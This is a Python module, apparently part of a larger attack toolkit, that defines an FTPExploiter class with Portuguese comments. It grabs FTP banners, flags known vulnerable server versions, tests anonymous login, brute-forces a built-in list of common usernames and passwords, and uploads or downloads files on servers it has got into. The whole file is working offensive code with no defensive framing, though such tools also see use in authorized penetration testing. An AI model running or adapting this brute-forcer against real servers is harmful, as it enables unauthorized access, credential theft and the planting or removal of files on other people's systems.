# modules/network/ftp.py
import ftplib
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

class FTPExploiter:
    def __init__(self):
        self.common_users = ['anonymous', 'ftp', 'admin', 'test', 'user', 'root']
        self.common_passwords = ['', 'anonymous', 'ftp', 'admin', 'test', 'password', '123456']

    def ftp_connect(self, target, port=21, username=None, password=None, timeout=5):
        """Tenta conexão FTP"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=timeout)
            
            if username is not None:
                ftp.login(username, password)
            else:
                ftp.login()  # Tenta login anonymous
            
            return ftp
        except:
            return None

    def check_anonymous_login(self, target, port=21):
        """Verifica login anonymous"""
        try:
            ftp = self.ftp_connect(target, port, 'anonymous', '')
            if ftp:
                files = ftp.nlst()
                ftp.quit()
                return True, files
        except:
            pass
        return False, []

    def brute_force_ftp(self, target, port=21):
        """Força bruta FTP"""
        valid_creds = []
        
        for user in self.common_users:
            for password in self.common_passwords:
                try:
                    ftp = self.ftp_connect(target, port, user, password)
                    if ftp:
                        valid_creds.append((user, password))
                        print(f"[+] FTP Credencial: {user}:{password}")
                        
                        # Lista arquivos
                        try:
                            files = ftp.nlst()
                            print(f"    [+] Arquivos: {files[:5]}...")
                        except:
                            pass
                            
                        ftp.quit()
                except:
                    continue
        
        return valid_creds

    def ftp_banner_grabbing(self, target, port=21):
        """Banner grabbing FTP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            s.close()
            
            return banner.strip()
        except:
            return "Unknown"

    def upload_file(self, target, username, password, local_file, remote_file):
        """Upload de arquivo via FTP"""
        try:
            ftp = self.ftp_connect(target, 21, username, password)
            if not ftp:
                return False
            
            with open(local_file, 'rb') as f:
                ftp.storbinary(f'STOR {remote_file}', f)
            
            ftp.quit()
            return True
            
        except:
            return False

    def download_file(self, target, username, password, remote_file, local_file):
        """Download de arquivo via FTP"""
        try:
            ftp = self.ftp_connect(target, 21, username, password)
            if not ftp:
                return False
            
            with open(local_file, 'wb') as f:
                ftp.retrbinary(f'RETR {remote_file}', f.write)
            
            ftp.quit()
            return True
            
        except:
            return False

    def check_ftp_version(self, target, port=21):
        """Verifica versão do FTP"""
        banner = self.ftp_banner_grabbing(target, port)
        
        # Detecta versões vulneráveis
        vulnerable_versions = [
            'vsFTPd 2.3.4',  # Backdoor famous
            'ProFTPD 1.3.3', # Vulnerable versions
        ]
        
        for vuln_version in vulnerable_versions:
            if vuln_version in banner:
                return banner, True
        
        return banner, False

    def scan_ftp(self, target, port=21):
        """Scan completo FTP"""
        print(f"[+] Scan FTP em: {target}:{port}")
        
        results = {
            'banner': None,
            'anonymous_login': False,
            'anonymous_files': [],
            'credentials': [],
            'vulnerable': False
        }
        
        # Banner grabbing
        results['banner'] = self.ftp_banner_grabbing(target, port)
        print(f"    [+] Banner: {results['banner']}")
        
        # Verifica versão vulnerável
        banner, is_vuln = self.check_ftp_version(target, port)
        results['vulnerable'] = is_vuln
        if is_vuln:
            print(f"    [!] VERSÃO VULNERÁVEL: {banner}")
        
        # Verifica login anonymous
        anonymous, files = self.check_anonymous_login(target, port)
        results['anonymous_login'] = anonymous
        results['anonymous_files'] = files
        if anonymous:
            print(f"    [!] ANONYMOUS LOGIN PERMITIDO")
            print(f"    [+] Arquivos: {files[:5]}...")
        
        # Força bruta
        results['credentials'] = self.brute_force_ftp(target, port)
        
        return results